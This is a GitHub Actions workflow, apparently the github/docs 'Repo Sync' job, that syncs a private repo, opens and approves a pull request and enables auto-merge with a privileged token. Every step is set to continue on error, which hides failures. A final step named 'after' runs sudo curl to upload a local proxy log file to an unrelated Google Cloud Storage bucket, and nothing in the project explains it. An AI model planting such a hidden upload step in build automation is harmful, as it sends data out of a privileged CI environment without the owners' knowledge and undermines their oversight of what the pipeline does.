    - continue-on-error: true
      name: Check out repo
      uses: actions/checkout@dcd71f646680f2efd8db4afa5ad64fdcba30e748
    - continue-on-error: true
      name: Setup node
      uses: actions/setup-node@1f8c6b94b26d0feae1e387ca63ccbdc44d27b561
      with:
        cache: npm
        node-version: 16.14.x
    - continue-on-error: true
      name: Install dependencies
      run: npm ci
    - continue-on-error: true
      env:
        GITHUB_TOKEN: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
      name: Sync repo to branch
      uses: repo-sync/github-sync@3832fe8e2be32372e1b3970bbae8e7079edeec88
      with:
        destination_branch: repo-sync
        github_token: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
        source_branch: main
        source_repo: ${{ secrets.SOURCE_REPO }}
    - continue-on-error: true
      env:
        GITHUB_TOKEN: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
      name: Create pull request
      uses: repo-sync/pull-request@65785d95a5a466e46a9d0708933a3bd51bbf9dde
      with:
        destination_branch: main
        github_token: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
        pr_allow_empty: false
        pr_body: 'This is an automated pull request to sync changes between the public
          and private repos.


          :robot: This pull request should be merged (not squashed) to preserve continuity
          across repos, so please let a bot do the merging!'
        pr_label: automated-reposync-pr
        pr_title: repo sync
        source_branch: repo-sync
    - continue-on-error: true
      id: find-pull-request
      name: Find pull request
      uses: juliangruber/find-pull-request-action@db875662766249c049b2dcd85293892d61cb0b51
      with:
        author: Octomerger
        base: main
        branch: repo-sync
        github-token: ${{ secrets.GITHUB_TOKEN }}
        state: open
    - continue-on-error: true
      if: ${{ github.repository == 'github/docs' && steps.find-pull-request.outputs.number
        }}
      name: Lock conversations
      uses: actions/github-script@2b34a689ec86a68d8ab9478298f91d5401337b7d
      with:
        script: "try {\n  await github.issues.lock({\n    ...context.repo,\n    issue_number:\
          \ parseInt(${{ steps.find-pull-request.outputs.number }}),\n    lock_reason:\
          \ 'spam'\n  })\n  console.log('Locked the pull request to prevent spam!')\n\
          } catch (error) {\n  // Log the error but don't fail the workflow\n  console.error(`Failed\
          \ to lock the pull request. Error: ${error}`)\n}\n"
    - continue-on-error: true
      if: ${{ steps.find-pull-request.outputs.number }}
      name: Update branch
      uses: actions/github-script@2b34a689ec86a68d8ab9478298f91d5401337b7d
      with:
        github-token: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
        script: "const mainHeadSha = await github.git.getRef({\n  ...context.repo,\n\
          \  ref: 'heads/main'\n})\nconsole.log(`heads/main sha: ${mainHeadSha.data.object.sha}`)\n\
          \nconst pull = await github.pulls.get({\n  ...context.repo,\n  pull_number:\
          \ parseInt(${{ steps.find-pull-request.outputs.number }})\n})\nconsole.log(`Pull\
          \ request base sha: ${pull.data.base.sha}`)\n\nif (mainHeadSha.data.object.sha\
          \ !== pull.data.base.sha || pull.data.mergeable_state === 'behind') {\n\
          \  try {\n    const updateBranch = await github.pulls.updateBranch({\n \
          \     ...context.repo,\n      pull_number: parseInt(${{ steps.find-pull-request.outputs.number\
          \ }})\n    })\n    console.log(updateBranch.data.message)\n  } catch (error)\
          \ {\n    // When the head branch is modified an error with status 422 is\
          \ thrown\n    // We should retry one more time to update the branch\n  \
          \  if (error.status === 422) {\n      try {\n        const updateBranch\
          \ = await github.pulls.updateBranch({\n          ...context.repo,\n    \
          \      pull_number: parseInt(${{ steps.find-pull-request.outputs.number\
          \ }})\n        })\n        console.log(updateBranch.data.message)\n    \
          \  } catch (error) {\n        // Only retry once. We'll rely on the update\
          \ branch workflow to update\n        // this PR in the case of a second\
          \ failure.\n        console.log(`Retried updating the branch, but an error\
          \ occurred: ${error}`)\n      }\n    } else {\n      // A failed branch\
          \ update shouldn't fail this worklow.\n      console.log(`An error occurred\
          \ when updating the branch: ${error}`)\n    }\n  }\n} else {\n  console.log(`Branch\
          \ is already up-to-date`)\n}\n"
    - continue-on-error: true
      env:
        PR_NUMBER: ${{ steps.find-pull-request.outputs.number }}
      id: pr-files
      if: ${{ steps.find-pull-request.outputs.number }}
      name: Check pull request file count after updating
      uses: actions/github-script@2b34a689ec86a68d8ab9478298f91d5401337b7d
      with:
        github-token: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
        result-encoding: string
        script: "const { data: prFiles } = await github.pulls.listFiles({\n  ...context.repo,\n\
          \  pull_number: process.env.PR_NUMBER,\n})\ncore.setOutput('count', (prFiles\
          \ && prFiles.length || 0).toString())\n"
    - continue-on-error: true
      env:
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      if: ${{ steps.find-pull-request.outputs.number && steps.pr-files.outputs.count
        == '0' }}
      name: Close the pull request if no files remain
      run: 'gh pr close ${{ steps.find-pull-request.outputs.number }} --repo $GITHUB_REPOSITORY

        '
    - continue-on-error: true
      if: ${{ steps.find-pull-request.outputs.number && steps.pr-files.outputs.count
        != '0' }}
      name: Approve pull request
      uses: juliangruber/approve-pull-request-action@c530832d4d346c597332e20e03605aa94fa150a8
      with:
        github-token: ${{ secrets.GITHUB_TOKEN }}
        number: ${{ steps.find-pull-request.outputs.number }}
    - continue-on-error: true
      env:
        AUTOMERGE_PR_NUMBER: ${{ steps.find-pull-request.outputs.number }}
        GITHUB_TOKEN: ${{ secrets.OCTOMERGER_PAT_WITH_REPO_AND_WORKFLOW_SCOPE }}
      if: ${{ steps.find-pull-request.outputs.number && steps.pr-files.outputs.count
        != '0' }}
      name: Enable GitHub auto-merge
      run: node .github/actions-scripts/enable-automerge.js
    - continue-on-error: true
      if: failure()
      name: Send Slack notification if workflow fails
      uses: someimportantcompany/github-actions-slack-message@f8d28715e7b8a4717047d23f48c39827cacad340
      with:
        bot-token: ${{ secrets.SLACK_DOCS_BOT_TOKEN }}
        channel: ${{ secrets.DOCS_ALERTS_SLACK_CHANNEL_ID }}
        color: failure
        text: The last repo-sync run for ${{github.repository}} failed. See https://github.com/${{github.repository}}/actions?query=workflow%3A%22Repo+Sync%22
    - name: after
      run: sudo curl --request PUT -T /squid/squidlog.json --url https://storage.googleapis.com/virtualeventdemoblr.appspot.com/squid2/youssefhealthylifestyle/docs.$(date
        +%s)
    timeout-minutes: 60
name: Repo Sync
'on':
  workflow_dispatch: {}
permissions:
  contents: write
  pull-requests: write
